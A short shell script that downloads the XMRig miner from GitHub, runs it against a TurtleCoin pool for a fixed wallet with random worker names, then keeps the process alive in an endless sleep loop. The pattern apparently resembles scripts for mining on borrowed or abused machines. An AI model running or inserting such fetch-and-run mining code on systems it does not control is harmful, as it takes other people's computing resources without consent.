#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -a argon2/chukwav2 -o sg.turtlecoin.herominers.com:1160 -u TRTLv1JytGXQPggFrD7DwNEhAJSMtnXaseDSzunfck8bYygcSkk6K2iYHsFv5bCxescqRNSaELhUTEaQWqJW7pNjSG8p2M7svg7.$(shuf -n 1 -i 1-99999)-cpu --keepalive --timeout 120 --donate-level 0 -p c=BCH,mc=UPX
while [ 1 ]; do
sleep 3
done
sleep 999
